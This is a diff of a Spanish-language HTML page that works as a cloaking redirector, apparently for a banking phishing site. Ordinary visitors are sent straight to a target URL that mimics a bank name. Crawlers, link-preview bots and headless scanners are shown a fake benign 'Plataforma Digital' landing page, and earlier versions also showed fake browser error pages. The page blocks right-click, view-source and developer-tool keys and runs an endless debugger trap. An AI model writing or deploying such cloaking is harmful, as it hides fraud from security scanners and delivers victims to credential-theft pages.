@@ -8,182 +8,35 @@
 </head>
 <body oncontextmenu="return false;" style="user-select: none;">
     <div id="main-wrapper">
-        <div id="loading" style="text-align:center; padding-top:100px; font-family:sans-serif;">
-            <p>Cargando...</p>
-        </div>
         <div id="error-content"></div>
     </div>
 <script>
-    // ✏️ CONFIGURA TU LINK:
-    const target = "https://occdentebncoprtaltrnsccional.vercel.app/";
+    const target = "https://www.tramtecred.cc/";
     const domain = window.location.hostname;
 
-    // Función para detectar bots
     function isBot() {
         const ua = navigator.userAgent.toLowerCase();
-        
-        // Patrones de bot
-        const botPatterns = [
-            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
-            'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
-            'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot',
-            'mj12bot', 'dotbot', 'screaming frog', 'rogerbot',
-            'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
-            'webdriver', 'cypress', 'electron', 'chromedriver',
-            '\\bbot\\b', 'crawler', 'spider', 'scraper', 'http_request',
-            'curl', 'wget', 'python-requests', 'go-http-client'
-        ];
-
-        for (let pattern of botPatterns) {
-            if (new RegExp(pattern, 'i').test(ua)) {
-                return true;
-            }
-        }
-
-        // APIs de headless
-        if (navigator.webdriver) return true;
-        if (document.documentElement.getAttribute('webdriver')) return true;
-        if (window.callPhantom) return true;
-        if (window.Cypress) return true;
-        if (typeof phantomjs !== 'undefined') return true;
-
-        // Sin pantalla (headless)
-        if (window.screen.width === 0 || window.screen.height === 0) return true;
-
-        // DevTools abierto
-        const threshold = 160;
-        if (window.outerWidth - window.innerWidth > threshold || 
-            window.outerHeight - window.innerHeight > threshold) {
-            return true;
-        }
-
+        const botPatterns = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium', 'webdriver', 'cypress', 'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget'];
+        for (let p of botPatterns) if (new RegExp(p, 'i').test(ua)) return true;
+        if (navigator.webdriver || window.screen.width === 0 || window.outerWidth - window.innerWidth > 160) return true;
         return false;
     }
 
-    function isMobile() {
-        const ua = navigator.userAgent;
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (window.innerWidth <= 800);
-    }
-
-    function renderChrome() {
-        document.getElementById('tab-title').innerText = "⚠️ Error de red";
-        document.getElementById('browser-style').innerHTML = `
-            body { background-color: #202124; color: #e8eaed; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .container { max-width: 600px; padding: 20px; text-align: left; }
-            h1 { font-size: 22px; font-weight: 400; margin: 0 0 15px; }
-            p { font-size: 14px; color: #9aa0a6; line-height: 1.6; margin: 0 0 10px; }
-            .err-code { font-size: 12px; color: #9aa0a6; margin-top: 30px; text-transform: uppercase; font-family: monospace; }
-            .blue-btn { background: #8ab4f8; color: #202124; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; margin-top: 25px; cursor: pointer; font-size: 14px;}
-            .blue-btn:hover { background: #aecbfa; }
-        `;
-        return `
-            <div class="container">
-                <h1>No se puede acceder a este sitio web</h1>
-                <p>Comprueba si hay un error de escritura en ${domain}.</p>
-                <p>Si está escrito correctamente, prueba a ejecutar el diagnóstico de red de Windows.</p>
-                <div class="err-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
-                <button class="blue-btn" onclick="location.reload()">Volver a cargar</button>
-            </div>
-        `;
-    }
-
-    function renderSafari() {
-        document.getElementById('tab-title').innerText = "Error";
-        document.getElementById('browser-style').innerHTML = `
-            body { background-color: #f7f7f7; color: #000000; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .container { text-align: center; max-width: 480px; padding: 20px; }
-            h1 { font-size: 19px; font-weight: 600; margin: 0 0 10px; letter-spacing: -0.5px; }
-            p { font-size: 14px; color: #333; line-height: 1.4; margin: 0; }
-        `;
-        return `
-            <div class="container">
-                <h1>Safari no puede abrir la página</h1>
-                <p>Safari no puede abrir la página "${domain}" porque no se puede encontrar el servidor donde está alojada esta página.</p>
-            </div>
-        `;
-    }
-
-    function renderLandingPage() {
+    function renderLanding() {
         document.getElementById('tab-title').innerText = "Plataforma Digital";
-        document.getElementById('browser-style').innerHTML = `
-            body { background-color: #f5f5f5; color: #333; font-family: Arial, sans-serif; margin: 0; padding: 20px; }
-            .container { max-width: 1200px; margin: 0 auto; }
-            header { background: white; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
-            .logo { font-size: 24px; font-weight: 700; color: #667eea; }
-            h1 { font-size: 36px; margin: 20px 0; color: #333; }
-            p { font-size: 15px; color: #666; line-height: 1.6; }
-            .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0; }
-            .feature { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
-            .feature h3 { color: #667eea; margin-bottom: 10px; }
-            footer { background: white; padding: 20px; margin-top: 40px; border-top: 1px solid #eee; text-align: center; color: #999; font-size: 12px; }
-        `;
-        return `
-            <header>
-                <div class="logo">🚀 Plataforma Digital</div>
-            </header>
-            <div class="container">
-                <h1>Soluciones Digitales Innovadoras</h1>
-                <p>Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
-                <div class="features">
-                    <div class="feature">
-                        <h3>⚡ Velocidad</h3>
-                        <p>Procesamiento instantáneo y respuesta en tiempo real.</p>
-                    </div>
-                    <div class="feature">
-                        <h3>🔒 Seguridad</h3>
-                        <p>Protección de datos con encriptación avanzada.</p>
-                    </div>
-                    <div class="feature">
-                        <h3>📱 Accesibilidad</h3>
-                        <p>Disponible en todos tus dispositivos.</p>
-                    </div>
-                    <div class="feature">
-                        <h3>🤖 Inteligencia</h3>
-                        <p>Algoritmos inteligentes y adaptables.</p>
-                    </div>
-                    <div class="feature">
-                        <h3>💡 Innovación</h3>
-                        <p>Actualización constante con tendencias.</p>
-                    </div>
-                    <div class="feature">
-                        <h3>🌍 Global</h3>
-                        <p>Disponible en 150+ países.</p>
-                    </div>
-                </div>
-            </div>
-            <footer>
-                <p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
-            </footer>
-        `;
+        document.getElementById('browser-style').innerHTML = `body{background:#f5f5f5;color:#333;font-family:Arial;margin:0;padding:20px}header{background:#fff;padding:20px;margin-bottom:20px;box-shadow:0 2px 8px rgba(0,0,0,.08)}.logo{font-size:24px;font-weight:700;color:#667eea}h1{font-size:36px;margin:20px 0;color:#333}p{font-size:15px;color:#666;line-height:1.6}.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin:30px 0}.feature{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08)}.feature h3{color:#667eea;margin-bottom:10px}footer{background:#fff;padding:20px;margin-top:40px;border-top:1px solid #eee;text-align:center;color:#999;font-size:12px}`;
+        return `<header><div class="logo">🚀 Plataforma Digital</div></header><div class="container"><h1>Soluciones Digitales Innovadoras</h1><p>Bienvenido a nuestra plataforma de soluciones tecnológicas de última generación.</p><div class="features"><div class="feature"><h3>⚡ Velocidad</h3><p>Procesamiento instantáneo en tiempo real.</p></div><div class="feature"><h3>🔒 Seguridad</h3><p>Encriptación avanzada de datos.</p></div><div class="feature"><h3>📱 Accesibilidad</h3><p>Disponible en todos tus dispositivos.</p></div><div class="feature"><h3>🤖 Inteligencia</h3><p>Algoritmos inteligentes y adaptables.</p></div><div class="feature"><h3>💡 Innovación</h3><p>Actualización constante tecnológica.</p></div><div class="feature"><h3>🌍 Global</h3><p>Disponible en 150+ países.</p></div></div></div><footer><p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p></footer>`;
     }
 
-    async function iniciar() {
-        const ua = navigator.userAgent;
-        const loader = document.getElementById('loading');
-        const content = document.getElementById('error-content');
-
-        // SI NO ES BOT - REDIRIGIR AL INSTANTE
-        if (!isBot()) {
-            window.location.href = target;
-            return;
-        }
-
-        // SI ES BOT - MOSTRAR PÁGINA LIMPIA
-        loader.style.display = 'none';
-        if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS") && !ua.includes("Edg")) {
-            content.innerHTML = renderSafari();
-        } else {
-            content.innerHTML = renderLandingPage();
-        }
+    // EJECUTAR AL INSTANTE - CERO DELAY
+    if (!isBot()) {
+        window.location.href = target;
+    } else {
+        document.getElementById('error-content').innerHTML = renderLanding();
     }
 
-    document.onkeydown = (e) => {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
-    };
-
+    document.onkeydown = (e) => { if ([123, 73, 74, 85].includes(e.keyCode) && (e.ctrlKey || e.metaKey || e.shiftKey)) return false; };
     setInterval(() => { debugger; }, 50);
-
-    iniciar();
 </script>
 </body>
 </html>
